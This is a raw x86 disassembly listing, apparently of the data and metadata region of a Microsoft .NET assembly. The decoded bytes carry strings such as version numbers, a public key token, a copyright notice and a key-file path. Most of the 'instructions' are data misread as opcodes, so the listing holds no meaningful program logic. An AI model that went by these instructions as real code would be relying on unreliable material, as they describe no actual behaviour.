  40c7ec:	gs jb  0x40c865
  40c7ef:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40c7f6:	ins    BYTE PTR es:[edi],dx
  40c7f7:	cs dec ecx
  40c7f9:	outs   dx,BYTE PTR ds:[esi]
  40c7fa:	jae    0x40c870
  40c7fc:	popa   
  40c7fd:	outs   dx,BYTE PTR ds:[esi]
  40c7fe:	arpl   WORD PTR [ebp+0x43],sp
  40c801:	outs   dx,DWORD PTR ds:[esi]
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	je     0x40c86a
  40c805:	js     0x40c87b
  40c807:	dec    ebp
  40c808:	outs   dx,DWORD PTR ds:[esi]
  40c809:	fs gs sub al,0x20
  40c80d:	push   ebx
  40c80e:	jns    0x40c883
  40c810:	je     0x40c877
  40c812:	ins    DWORD PTR es:[edi],dx
  40c813:	cs push ebx
  40c815:	gs jb  0x40c88e
  40c818:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40c81f:	ins    BYTE PTR es:[edi],dx
  40c820:	sub    al,0x20
  40c822:	push   esi
  40c823:	gs jb  0x40c899
  40c826:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  40c82d:	xor    BYTE PTR cs:[esi],ch
  40c830:	xor    BYTE PTR [eax+eiz*1],ch
  40c833:	inc    ebx
  40c834:	jne    0x40c8a2
  40c836:	je     0x40c8ad
  40c838:	jb     0x40c89f
  40c83a:	cmp    eax,0x7475656e
  40c83f:	jb     0x40c8a2
  40c841:	ins    BYTE PTR es:[edi],dx
  40c842:	sub    al,0x20
  40c844:	push   eax
  40c845:	jne    0x40c8a9
  40c847:	ins    BYTE PTR es:[edi],dx
  40c848:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40c84f:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40c853:	bound  esi,QWORD PTR [edi]
  40c855:	aaa    
  40c856:	popa   
  40c857:	xor    eax,0x31363563
  40c85c:	cmp    DWORD PTR [ebx],esi
  40c85e:	xor    al,0x65
  40c860:	xor    BYTE PTR [eax],bh
  40c862:	cmp    DWORD PTR [ebx],edx
  40c864:	dec    ecx
  40c865:	outs   dx,BYTE PTR ds:[esi]
  40c866:	jae    0x40c8dc
  40c868:	popa   
  40c869:	outs   dx,BYTE PTR ds:[esi]
  40c86a:	arpl   WORD PTR [ebp+0x43],sp
  40c86d:	outs   dx,DWORD PTR ds:[esi]
  40c86e:	outs   dx,BYTE PTR ds:[esi]
  40c86f:	je     0x40c8d6
  40c871:	js     0x40c8e7
  40c873:	dec    ebp
  40c874:	outs   dx,DWORD PTR ds:[esi]
  40c875:	fs add BYTE PTR gs:[eax],al
  40c879:	add    BYTE PTR [eax],al
  40c87b:	push   esp
  40c87c:	add    bl,BYTE PTR [esi]
  40c87e:	dec    ecx
  40c87f:	outs   dx,BYTE PTR ds:[esi]
  40c880:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  40c884:	gs inc ebp
  40c886:	js     0x40c8eb
  40c888:	gs jo  0x40c8ff
  40c88b:	imul   ebp,DWORD PTR [edi+0x6e],0x61746544
  40c892:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x6c756146
  40c89a:	je     0x40c90f
  40c89c:	add    DWORD PTR [ebp+edx*2+0x7b],edx
  40c8a0:	push   ebx
  40c8a1:	jns    0x40c916
  40c8a3:	je     0x40c90a
  40c8a5:	ins    DWORD PTR es:[edi],dx
  40c8a6:	cs push ebx
  40c8a8:	gs jb  0x40c921
  40c8ab:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40c8b2:	ins    BYTE PTR es:[edi],dx
  40c8b3:	cs inc ebx
  40c8b5:	outs   dx,DWORD PTR ds:[esi]
  40c8b6:	outs   dx,BYTE PTR ds:[esi]
  40c8b7:	arpl   WORD PTR [ebp+0x72],si
  40c8ba:	jb     0x40c921
  40c8bc:	outs   dx,BYTE PTR ds:[esi]
  40c8bd:	arpl   WORD PTR [ecx+0x4d],di
  40c8c0:	outs   dx,DWORD PTR ds:[esi]
  40c8c1:	fs gs sub al,0x20
  40c8c5:	push   ebx
  40c8c6:	jns    0x40c93b
  40c8c8:	je     0x40c92f
  40c8ca:	ins    DWORD PTR es:[edi],dx
  40c8cb:	cs push ebx
  40c8cd:	gs jb  0x40c946
  40c8d0:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40c8d7:	ins    BYTE PTR es:[edi],dx
  40c8d8:	sub    al,0x20
  40c8da:	push   esi
  40c8db:	gs jb  0x40c951
  40c8de:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  40c8e5:	xor    BYTE PTR cs:[esi],ch
  40c8e8:	xor    BYTE PTR [eax+eiz*1],ch
  40c8eb:	inc    ebx
  40c8ec:	jne    0x40c95a
  40c8ee:	je     0x40c965
  40c8f0:	jb     0x40c957
  40c8f2:	cmp    eax,0x7475656e
  40c8f7:	jb     0x40c95a
  40c8f9:	ins    BYTE PTR es:[edi],dx
  40c8fa:	sub    al,0x20
  40c8fc:	push   eax
  40c8fd:	jne    0x40c961
  40c8ff:	ins    BYTE PTR es:[edi],dx
  40c900:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40c907:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40c90b:	bound  esi,QWORD PTR [edi]
  40c90d:	aaa    
  40c90e:	popa   
  40c90f:	xor    eax,0x31363563
  40c914:	cmp    DWORD PTR [ebx],esi
  40c916:	xor    al,0x65
  40c918:	xor    BYTE PTR [eax],bh
  40c91a:	cmp    DWORD PTR [edi],ecx
  40c91c:	inc    ebx
  40c91d:	outs   dx,DWORD PTR ds:[esi]
  40c91e:	outs   dx,BYTE PTR ds:[esi]
  40c91f:	arpl   WORD PTR [ebp+0x72],si
  40c922:	jb     0x40c989
  40c924:	outs   dx,BYTE PTR ds:[esi]
  40c925:	arpl   WORD PTR [ecx+0x4d],di
  40c928:	outs   dx,DWORD PTR ds:[esi]
  40c929:	fs add DWORD PTR gs:[eax],eax
  40c92d:	add    BYTE PTR [eax],al
  40c92f:	add    eax,0x80120000
  40c934:	xchg   ebp,eax
  40c935:	add    eax,0x8112010a
  40c93a:	or     DWORD PTR ds:0x81120107,eax
  40c940:	or     DWORD PTR ds:0x121c0100,eax
  40c946:	sbb    eax,0x1012005
  40c94b:	adc    ah,BYTE PTR [ecx]
  40c94d:	add    eax,0x80120107
  40c952:	mov    ch,0x6
  40c954:	and    BYTE PTR [ecx],al
  40c956:	add    DWORD PTR [edx],edx
  40c958:	or     cl,0x6
  40c95b:	and    BYTE PTR [ecx],al
  40c95d:	add    DWORD PTR [ecx],edx
  40c95f:	adc    cl,0x8
  40c962:	and    BYTE PTR [edx],al
  40c964:	add    DWORD PTR [edx],edx
  40c966:	and    eax,0x8d58212
  40c96b:	and    BYTE PTR [ecx],al
  40c96d:	adc    al,BYTE PTR [eax-0x427fed17]
  40c973:	or     al,0x20
  40c975:	add    eax,0xe0e0e01
  40c97a:	adc    al,BYTE PTR [edx-0x167fed33]
  40c980:	add    eax,0x80120020
  40c985:	mov    ebp,0x82121508
  40c98a:	loope  0x40c98d
  40c98c:	adc    al,BYTE PTR [edx+0x22006dd]
  40c992:	add    DWORD PTR [ebx],edx
  40c994:	add    BYTE PTR [esi],cl
  40c996:	or     eax,DWORD PTR [edi]
  40c998:	add    edx,DWORD PTR [edx]
  40c99a:	or     ch,0x12
  40c99d:	sbb    cl,0x12
  40c9a0:	sbb    ch,0x6
  40c9a3:	pop    es
  40c9a4:	add    al,BYTE PTR [edx]
  40c9a6:	adc    al,BYTE PTR [eax+0x20706d9]
  40c9ac:	push   cs
  40c9ad:	adc    al,BYTE PTR [eax+0x4200ed9]
  40c9b3:	add    DWORD PTR [esi],ecx
  40c9b5:	adc    BYTE PTR [edx],dl
  40c9b7:	cmp    BYTE PTR [ebp-0xa7fedf0],0x10
  40c9be:	push   cs
  40c9bf:	or     DWORD PTR [eax],eax
  40c9c1:	add    al,BYTE PTR [edx]
  40c9c3:	adc    al,BYTE PTR [eax-0x427fed43]
  40c9c9:	or     DWORD PTR [eax],eax
  40c9cb:	add    DWORD PTR ds:0x1598212,edx
  40c9d1:	push   cs
  40c9d2:	push   cs
  40c9d3:	add    al,0x20
  40c9d5:	add    DWORD PTR [esi],ecx
  40c9d7:	or     BYTE PTR ds:0x80120907,ah
  40c9dd:	mov    ebp,0x19811215
  40c9e2:	add    DWORD PTR [esi],ecx
  40c9e4:	adc    eax,0x1198112
  40c9e9:	push   cs
  40c9ea:	adc    eax,0x1598212
  40c9ef:	push   cs
  40c9f0:	push   cs
  40c9f1:	push   cs
  40c9f2:	adc    al,BYTE PTR [eax-0x227ded27]
  40c9f8:	adc    eax,0x15d8212
  40c9fd:	push   cs
  40c9fe:	adc    esp,DWORD PTR [eax]
  40ca00:	add    eax,0xeed8212
  40ca05:	push   cs
  40ca06:	adc    BYTE PTR [edx],dl
  40ca08:	cmp    BYTE PTR [ebp-0xa7fedf0],0x10
  40ca0f:	adc    al,BYTE PTR [edx+0x4070ef1]
  40ca15:	adc    al,BYTE PTR [edx-0x427fed0f]
  40ca1b:	adc    al,BYTE PTR [eax-0x227ded27]
  40ca21:	or     DWORD PTR [eax],esp
  40ca23:	add    ecx,DWORD PTR [esi]
  40ca25:	push   cs
  40ca26:	push   cs
  40ca27:	adc    BYTE PTR [edx],dl
  40ca29:	xor    cl,0x5
  40ca2c:	and    BYTE PTR [eax],al
  40ca2e:	adc    al,BYTE PTR [edx+0x9071af9]
  40ca34:	adc    al,BYTE PTR [edx-0x7deef70f]
  40ca3a:	std    
  40ca3b:	adc    al,BYTE PTR [ebx-0x67fedff]
  40ca41:	adc    al,BYTE PTR [eax-0x227ded27]
  40ca47:	adc    al,BYTE PTR [edx+0xa4912f9]
  40ca4d:	pop    es
  40ca4e:	add    ebx,DWORD PTR ds:0xd980120e
  40ca54:	adc    al,BYTE PTR [edx+0x30709dd]
  40ca5a:	add    dl,BYTE PTR [edx]
  40ca5c:	sbb    cl,0x12
  40ca5f:	sbb    ch,0x8
  40ca62:	pop    es
  40ca63:	add    dl,BYTE PTR [edx]
  40ca65:	sbb    cl,0x12
  40ca68:	sbb    ch,0x5
  40ca6b:	and    BYTE PTR [eax],al
  40ca6d:	adc    al,BYTE PTR [edx+0x9071af1]
  40ca73:	adc    al,BYTE PTR [edx-0x7deef70f]
  40ca79:	std    
  40ca7a:	adc    al,BYTE PTR [ebx-0x27fedfb]
  40ca80:	adc    al,BYTE PTR [eax-0x227ded27]
  40ca86:	adc    al,BYTE PTR [edx+0x64912f9]
  40ca8c:	add    BYTE PTR [ecx],al
  40ca8e:	adc    al,BYTE PTR [eax+0x20070ec5]
  40ca94:	add    dl,BYTE PTR [edx]
  40ca96:	cmp    BYTE PTR [ebp+0x2005020e],0x2
  40ca9d:	add    cl,BYTE PTR [eax]
  40ca9f:	add    dl,BYTE PTR [edx]
  40caa1:	pop    es
  40caa2:	push   es
  40caa3:	adc    al,BYTE PTR [eax-0x3a7fed43]
  40caa9:	adc    al,BYTE PTR [eax-0x7fede327]
  40caaf:	fst    DWORD PTR [edx]
  40cab1:	sbb    ch,0x10
  40cab4:	and    BYTE PTR [esi],al
  40cab6:	sbb    al,0xe
  40cab8:	adc    DWORD PTR [ebx+0xd831209],eax
  40cabe:	sbb    al,0x1d
  40cac0:	sbb    al,0x12
  40cac2:	sbb    ecx,0x12022008
  40cac8:	cmp    eax,0x2bd8012
  40cacd:	or     eax,0xe1c0520
  40cad2:	adc    DWORD PTR [ebx+0xd831209],eax
  40cad8:	sbb    al,0x1d
  40cada:	sbb    al,0xf
  40cadc:	pop    es
  40cadd:	or     BYTE PTR ds:0x123d120e,bl
  40cae3:	sub    BYTE PTR ds:0x1c02081c,bl
  40cae9:	adc    bh,BYTE PTR ds:0x12002005
  40caef:	sbb    cl,0x1d
  40caf2:	pop    es
  40caf3:	or     DWORD PTR [edx],edx
  40caf5:	and    BYTE PTR [ecx+0x12dd8212],0x83
  40cafc:	adc    DWORD PTR [edx],edx
  40cafe:	sbb    ch,0x12
  40cb01:	adc    DWORD PTR ds:0x12dd8212,0xffffff82
  40cb08:	fst    QWORD PTR [edx]
  40cb0a:	sbb    ch,0x12
  40cb0d:	sbb    ch,0x6
  40cb10:	and    BYTE PTR [edx],al
  40cb12:	add    DWORD PTR [esi],ecx
  40cb14:	adc    bl,BYTE PTR [ecx]
  40cb16:	push   es
  40cb17:	and    BYTE PTR [edx],al
  40cb19:	add    DWORD PTR [edx],edx
  40cb1b:	sbb    DWORD PTR [edx],eax
  40cb1d:	add    eax,0x83120020
  40cb22:	sbb    eax,0x120d0726
  40cb27:	sbb    BYTE PTR [edx],dl
  40cb29:	and    BYTE PTR [ecx+0x12158312],0x80
  40cb30:	popf   
  40cb31:	adc    al,BYTE PTR [eax-0x267fed27]
  40cb37:	adc    al,BYTE PTR [eax+0x158312a1]
  40cb3d:	adc    al,BYTE PTR [eax+0x6182129d]
  40cb43:	adc    cl,BYTE PTR [ecx+0x12]
  40cb46:	and    BYTE PTR [ecx+0x12],0x49
  40cb4a:	add    al,0x7
  40cb4c:	add    DWORD PTR [edx],edx
  40cb4e:	dec    eax
  40cb4f:	add    eax,0x83110020
  40cb54:	and    eax,0x11010705
  40cb59:	or     DWORD PTR ds:0x11002005,0x62983
  40cb63:	add    DWORD PTR [ecx],edx
  40cb65:	xor    BYTE PTR [ecx+0x1106040d],0x81
  40cb6c:	or     eax,0x12010704
  40cb71:	pop    eax
  40cb72:	add    al,0x7
  40cb74:	add    DWORD PTR [edx],edx
  40cb76:	pop    esp
  40cb77:	add    al,0x6
  40cb79:	adc    DWORD PTR [ecx+0x1070411],eax
  40cb7f:	adc    ah,BYTE PTR [eax+0x4]
  40cb82:	pop    es
  40cb83:	add    DWORD PTR [edx],edx
  40cb85:	fs add al,0x7
  40cb88:	add    DWORD PTR [edx],edx
  40cb8a:	push   0x12010704
  40cb8f:	ins    BYTE PTR es:[edi],dx
  40cb90:	add    al,0x7
  40cb92:	add    DWORD PTR [edx],edx
  40cb94:	jo     0x40cb9f
  40cb96:	push   es
  40cb97:	adc    eax,0x1198112
  40cb9c:	adc    al,BYTE PTR [ecx+0x11060415]
  40cba2:	sbb    DWORD PTR ds:0x12010704,0x1000574
  40cbac:	add    DWORD PTR [edx],edx
  40cbae:	push   ecx
  40cbaf:	add    al,0x7
  40cbb1:	add    DWORD PTR [edx],edx
  40cbb3:	dec    esp
  40cbb4:	add    eax,0x83120000
  40cbb9:	sub    eax,0x1012006
  40cbbe:	adc    al,BYTE PTR [ebx+0x331]
  40cbc4:	push   cs
  40cbc5:	push   es
  40cbc6:	add    BYTE PTR [ecx],al
  40cbc8:	adc    al,BYTE PTR [edx+0x90e65]
  40cbce:	add    al,BYTE PTR [edx]
  40cbd0:	adc    DWORD PTR [ecx+0x29811129],eax
  40cbd6:	push   es
  40cbd7:	add    BYTE PTR [ebx],al
  40cbd9:	add    DWORD PTR [esi],ecx
  40cbdb:	push   cs
  40cbdc:	add    dl,BYTE PTR [eax]
  40cbde:	pop    es
  40cbdf:	push   es
  40cbe0:	adc    al,BYTE PTR [eax+0x110e0ec5]
  40cbe6:	sub    DWORD PTR [ecx],0x12298111
  40cbec:	add    cl,0x8
  40cbef:	add    BYTE PTR [ecx],al
  40cbf1:	adc    al,BYTE PTR [eax-0x427fed3b]
  40cbf7:	or     BYTE PTR [eax],ah
  40cbf9:	add    edx,DWORD PTR [edx]
  40cbfb:	cmp    BYTE PTR [ebp+0x502020e],0x7
  40cc02:	add    DWORD PTR [edx],edx
  40cc04:	add    ch,0x4
  40cc07:	push   es
  40cc08:	adc    DWORD PTR [ecx+0x1070529],eax
  40cc0e:	adc    DWORD PTR [ecx+0x1070529],eax
  40cc14:	adc    al,BYTE PTR [ecx+0x2070715]
  40cc1a:	adc    dl,BYTE PTR [ebp+0x12]
  40cc1d:	adc    DWORD PTR ds:0x12010006,0x70e3983
  40cc27:	adc    eax,0x1198112
  40cc2c:	adc    dl,BYTE PTR [eax+ecx*1+0x15]
  40cc30:	adc    al,BYTE PTR [ecx-0x7eedfee7]
  40cc36:	adc    eax,0x15002009
  40cc3b:	adc    DWORD PTR [ebx+0x13013d],eax
  40cc41:	or     BYTE PTR ds:0x13d8311,dl
  40cc47:	adc    al,BYTE PTR [ecx+0x4071c15]
  40cc4d:	adc    eax,0x1198112
  40cc52:	adc    dl,BYTE PTR [ebp+edx*1+0x12]
  40cc56:	sbb    DWORD PTR [ecx],0x15811201
  40cc5c:	adc    al,BYTE PTR [ecx-0x7ceeeaeb]
  40cc62:	cmp    eax,0x15811201
  40cc67:	pop    es
  40cc68:	adc    eax,0x1198112
  40cc6d:	adc    dl,BYTE PTR [eax+0x1c]
  40cc70:	pop    es
  40cc71:	add    al,0x15
  40cc73:	adc    al,BYTE PTR [ecx+0x50120119]
  40cc79:	adc    eax,0x1198112
  40cc7e:	adc    al,BYTE PTR [ecx+0x15811215]
  40cc84:	adc    eax,0x13d8311
  40cc89:	adc    al,BYTE PTR [ecx+0x12150815]
  40cc8f:	sbb    DWORD PTR [ecx],0x41831201
  40cc95:	sbb    eax,0x12150407
  40cc9a:	sbb    DWORD PTR [ecx],0x41831201
  40cca0:	adc    eax,0x1198112
  40cca5:	adc    al,BYTE PTR [ecx+0x15811215]
  40ccab:	adc    eax,0x13d8311
  40ccb0:	adc    al,BYTE PTR [ecx+0x13715]
  40ccb6:	sbb    ch,BYTE PTR [esi]
  40ccb8:	dec    esi
  40ccb9:	inc    ebp
  40ccba:	push   esp
  40ccbb:	inc    esi
  40ccbc:	jb     0x40cd1f
  40ccbe:	ins    DWORD PTR es:[edi],dx
  40ccbf:	gs ja  0x40cd31
  40ccc2:	jb     0x40cd2f
  40ccc4:	sub    al,0x56
  40ccc6:	gs jb  0x40cd3c
  40ccc9:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40ccd0:	xor    eax,0xe540001
  40ccd5:	adc    al,0x46
  40ccd7:	jb     0x40cd3a
  40ccd9:	ins    DWORD PTR es:[edi],dx
  40ccda:	gs ja  0x40cd4c
  40ccdd:	jb     0x40cd4a
  40ccdf:	inc    esp
  40cce0:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  40cce7:	popa   
  40cce8:	ins    DWORD PTR es:[edi],dx
  40cce9:	add    BYTE PTR gs:0x1,al
  40ccf0:	add    BYTE PTR [eax],ch
  40ccf2:	add    DWORD PTR [eax],eax
  40ccf4:	and    ecx,DWORD PTR [ebp+0x69]
  40ccf7:	arpl   WORD PTR [edx+0x6f],si
  40ccfa:	jae    0x40cd6b
  40ccfc:	data16 je 0x40cd2d
  40ccff:	push   esi
  40cd00:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40cd07:	jne    0x40cd6d
  40cd09:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  40cd10:	dec    eax
  40cd11:	outs   dx,DWORD PTR ds:[esi]
  40cd12:	jae    0x40cd88
  40cd14:	cs gs js 0x40cd7d
  40cd18:	add    BYTE PTR [eax],al
  40cd1a:	sbb    al,BYTE PTR [ecx]
  40cd1c:	add    BYTE PTR ds:0x7263694d,dl
  40cd22:	outs   dx,DWORD PTR ds:[esi]
  40cd23:	jae    0x40cd94
  40cd25:	data16 je 0x40cd48
  40cd28:	inc    ebx
  40cd29:	outs   dx,DWORD PTR ds:[esi]
  40cd2a:	jb     0x40cd9c
  40cd2c:	outs   dx,DWORD PTR ds:[esi]
  40cd2d:	jb     0x40cd90
  40cd2f:	je     0x40cd9a
  40cd31:	outs   dx,DWORD PTR ds:[esi]
  40cd32:	outs   dx,BYTE PTR ds:[esi]
  40cd33:	add    BYTE PTR [eax],al
  40cd35:	and    eax,0x4d200001
  40cd3a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40cd41:	je     0x40cd05
  40cd43:	scas   al,BYTE PTR es:[edi]
  40cd44:	and    BYTE PTR [esi+0x69],dl
  40cd47:	jae    0x40cdbe
  40cd49:	popa   
  40cd4a:	ins    BYTE PTR es:[edi],dx
  40cd4b:	and    BYTE PTR [ebx+0x74],dl
  40cd4e:	jne    0x40cdb4
  40cd50:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  40cd57:	xor    DWORD PTR [edx],esi
  40cd59:	add    BYTE PTR [eax],al
  40cd5b:	xor    eax,DWORD PTR [ecx]
  40cd5d:	add    BYTE PTR [esi],ch
  40cd5f:	ret    0x20a9
  40cd62:	dec    ebp
  40cd63:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40cd6a:	je     0x40cd8c
  40cd6c:	inc    ebx
  40cd6d:	outs   dx,DWORD PTR ds:[esi]
  40cd6e:	jb     0x40cde0
  40cd70:	outs   dx,DWORD PTR ds:[esi]
  40cd71:	jb     0x40cdd4
  40cd73:	je     0x40cdde
  40cd75:	outs   dx,DWORD PTR ds:[esi]
  40cd76:	outs   dx,BYTE PTR ds:[esi]
  40cd77:	and    BYTE PTR cs:[ecx+0x6c],al
  40cd7b:	ins    BYTE PTR es:[edi],dx
  40cd7c:	and    BYTE PTR [edx+0x69],dh
  40cd7f:	addr16 push 0x72207374
  40cd85:	gs jae 0x40cded
  40cd88:	jb     0x40ce00
  40cd8a:	gs fs add BYTE PTR cs:[eax],al
  40cd8f:	adc    DWORD PTR [ecx],eax
  40cd91:	add    BYTE PTR [ecx+esi*1],cl
  40cd94:	xor    DWORD PTR [esi],ebp
  40cd96:	xor    BYTE PTR [esi],ch
  40cd98:	xor    eax,0x37323730
  40cd9d:	xor    DWORD PTR cs:[eax],eax
  40cda0:	add    BYTE PTR ds:0x31080001,cl
  40cda6:	xor    DWORD PTR [esi],ebp
  40cda8:	xor    BYTE PTR [esi],ch
  40cdaa:	xor    BYTE PTR [esi],ch
  40cdac:	xor    BYTE PTR [eax],al
  40cdae:	add    BYTE PTR [edx],cl
  40cdb0:	add    DWORD PTR [eax],eax
  40cdb2:	add    eax,0x552d6e65
  40cdb7:	push   ebx
  40cdb8:	add    BYTE PTR [eax],al
  40cdba:	add    eax,0x10001
  40cdbf:	add    BYTE PTR [edx],ch
  40cdc1:	add    DWORD PTR [eax],eax
  40cdc3:	and    eax,0x645c3a46
  40cdc8:	fs pop esp
  40cdca:	je     0x40ce3b
  40cdcc:	outs   dx,DWORD PTR ds:[esi]
  40cdcd:	ins    BYTE PTR es:[edi],dx
  40cdce:	jae    0x40ce2c
  40cdd0:	fs gs jbe 0x40ce38
  40cdd4:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40cddb:	ins    BYTE PTR es:[edi],dx
  40cddc:	push   eax
  40cddd:	jne    0x40ce41
  40cddf:	ins    BYTE PTR es:[edi],dx
  40cde0:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40cde7:	outs   dx,BYTE PTR ds:[esi]
  40cde8:	imul   eax,DWORD PTR [eax],0x0
  40cdeb:	or     DWORD PTR [eax+0x1],0x0
  40cdef:	add    BYTE PTR [eax+0x30],0x30
  40cdf3:	xor    dh,BYTE PTR [eax+esi*1]
  40cdf6:	xor    BYTE PTR [eax],dh
  40cdf8:	xor    BYTE PTR [eax],dh
  40cdfa:	arpl   WORD PTR [eax],di
  40cdfc:	xor    BYTE PTR [eax],dh
  40cdfe:	xor    BYTE PTR [eax],dh
  40ce00:	xor    BYTE PTR [ecx],dh
  40ce02:	xor    al,0x30
  40ce04:	xor    DWORD PTR [eax],esi
  40ce06:	xor    BYTE PTR [eax],dh
  40ce08:	xor    BYTE PTR [eax],dh
  40ce0a:	xor    BYTE PTR ss:[edx],dh
  40ce0d:	xor    BYTE PTR [eax],dh
  40ce0f:	xor    BYTE PTR [eax],dh
  40ce11:	xor    BYTE PTR [eax],dh
  40ce13:	xor    dh,BYTE PTR [eax+esi*1]
  40ce16:	xor    BYTE PTR [eax],dh
  40ce18:	xor    BYTE PTR ds:0x34333532,dh
  40ce1e:	xor    DWORD PTR [ebx],esi
  40ce20:	xor    DWORD PTR [eax],esi
  40ce22:	xor    BYTE PTR [eax],dh
  40ce24:	cmp    BYTE PTR [eax],dh
  40ce26:	xor    BYTE PTR [eax],dh
  40ce28:	xor    BYTE PTR [eax],dh
  40ce2a:	xor    DWORD PTR [eax],esi
  40ce2c:	xor    BYTE PTR [eax],dh
  40ce2e:	xor    DWORD PTR [eax],esi
  40ce30:	xor    BYTE PTR [esi],dh
  40ce32:	xor    DWORD PTR [ebx],esi
  40ce34:	xor    edi,DWORD PTR [ecx]
  40ce36:	cmp    DWORD PTR [ecx+0x66],esp
  40ce39:	xor    WORD PTR [eax],di
  40ce3c:	xor    WORD PTR gs:[ecx+0x32],sp
  40ce41:	arpl   WORD PTR [edx],si
  40ce43:	xor    eax,0x32613431
  40ce48:	aaa    
  40ce49:	xor    esp,DWORD PTR [ecx+0x34]
  40ce4c:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  40ce50:	xor    al,0x32
  40ce52:	bound  esi,QWORD PTR [edi]
  40ce54:	xor    dh,BYTE PTR [ebx]
  40ce56:	xor    dh,BYTE PTR [ecx]
  40ce58:	xor    WORD PTR [edi],si
  40ce5b:	xor    eax,0x32303137
  40ce60:	cmp    WORD PTR fs:[ebp+0x62],sp
  40ce65:	popa   
  40ce66:	fs popa 
  40ce68:	cmp    DWORD PTR ss:[ecx],edi
  40ce6b:	xor    dh,BYTE PTR [ebx]
  40ce6d:	xor    dh,BYTE PTR gs:[edi]
  40ce70:	xor    edi,DWORD PTR [eax]
  40ce72:	xor    al,0x30
  40ce74:	arpl   WORD PTR ss:[edx],si
  40ce77:	xor    DWORD PTR [ebp+0x35],esp
  40ce7a:	bound  edi,QWORD PTR [eax]
  40ce7c:	xor    BYTE PTR [ecx],dh
  40ce7e:	xor    eax,0x62613235
  40ce83:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  40ce87:	xor    BYTE PTR [ecx+0x36],ah
  40ce8a:	xor    eax,0x35333261
  40ce8f:	xor    BYTE PTR gs:[eax],dh
  40ce92:	xor    DWORD PTR [ecx+0x63],esp
  40ce95:	cmp    DWORD PTR [ecx+0x64],esp
  40ce98:	arpl   WORD PTR [edx],si
  40ce9a:	xor    eax,0x38643266
  40ce9f:	xor    DWORD PTR [ecx],esi
  40cea1:	bound  esi,QWORD PTR gs:[eax]
  40cea4:	cmp    DWORD PTR [ecx+edi*1],esi
  40cea7:	ss popa 
  40cea9:	xor    al,0x63
  40ceab:	ss popa 
  40cead:	xor    eax,0x36346439
  40ceb2:	xor    DWORD PTR [ecx],edi
  40ceb4:	xor    eax,0x36633938
  40ceb9:	cmp    DWORD PTR [esi+0x35],esp
  40cebc:	bound  esp,QWORD PTR [ecx+0x66]
  40cebf:	xor    BYTE PTR [ebx+0x34],ah
  40cec2:	xor    DWORD PTR [edi],esi
  40cec4:	cmp    DWORD PTR [ecx+0x34],esp
  40cec7:	aaa    
  40cec8:	xor    esi,DWORD PTR [ecx]
  40ceca:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  40cece:	xor    eax,0x64633535
  40ced3:	xor    BYTE PTR [eax],dh
  40ced5:	ss popa 
  40ced7:	arpl   WORD PTR [ebx+0x38],sp
  40ceda:	bound  esi,QWORD PTR ds:0x66393539
  40cee0:	xor    ah,BYTE PTR [edx+0x64]
  40cee3:	ss xor DWORD PTR gs:[eax],esi
  40cee7:	xor    esi,DWORD PTR gs:[esi]
  40ceea:	xor    BYTE PTR [ebx+0x33],ah
  40ceed:	xor    al,0x35
  40ceef:	xor    esi,DWORD PTR [edi]
  40cef1:	popa   
  40cef2:	xor    DWORD PTR [edx+esi*1+0x36],esp
  40cef6:	ss fs popa 
  40cef9:	cmp    BYTE PTR [eax],dh
  40cefb:	cmp    BYTE PTR ds:0x35363538,dh
  40cf01:	cmp    BYTE PTR [ebx],dh
  40cf03:	arpl   WORD PTR [eax],di
  40cf05:	xor    eax,0x64313864
  40cf0a:	popa   
  40cf0b:	aaa    
  40cf0c:	xor    sp,WORD PTR [ebp+0x63]
  40cf10:	xor    BYTE PTR [ecx],dh
  40cf12:	gs cmp DWORD PTR fs:0x35633436,esi
  40cf1a:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  40cf1e:	fs aaa 
  40cf20:	xor    DWORD PTR [ebx],esi
  40cf22:	arpl   WORD PTR [eax+esi*1+0x31],sp
  40cf26:	aaa    
  40cf27:	xor    ah,BYTE PTR [ebx+0x38]
  40cf2a:	xor    dh,BYTE PTR gs:[ebx]
  40cf2d:	popa   
  40cf2e:	xor    DWORD PTR [eax],esi
  40cf30:	data16 xor BYTE PTR [edx],dh
  40cf33:	xor    edi,DWORD PTR [ecx]
  40cf35:	bound  edi,QWORD PTR [eax]
  40cf37:	xor    BYTE PTR [ebx+0x39],ah
  40cf3a:	bound  esi,QWORD PTR ss:[eax]
  40cf3d:	aaa    
  40cf3e:	aaa    
  40cf3f:	xor    esi,DWORD PTR [esi]
  40cf41:	xor    ax,0x3864
  40cf45:	bound  esi,QWORD PTR [eax]
  40cf47:	xor    dh,BYTE PTR [edx]
  40cf49:	xor    eax,0x34613234
  40cf4e:	gs aaa 
  40cf50:	xor    al,0x32
  40cf52:	xor    eax,0x66356131
  40cf57:	xor    al,0x33
  40cf59:	xor    bh,BYTE PTR [eax]
  40cf5b:	xor    dh,BYTE PTR [ebx+esi*1]
  40cf5e:	xor    DWORD PTR [eax],edi
  40cf60:	bound  esi,QWORD PTR [ebx]
  40cf62:	xor    eax,0x35613933
  40cf67:	popa   
  40cf68:	xor    BYTE PTR [eax],bh
  40cf6a:	aaa    
  40cf6b:	data16 cmp BYTE PTR [ebp+0x35],ah
  40cf6f:	xor    esp,DWORD PTR [edx+esi*1+0x66]
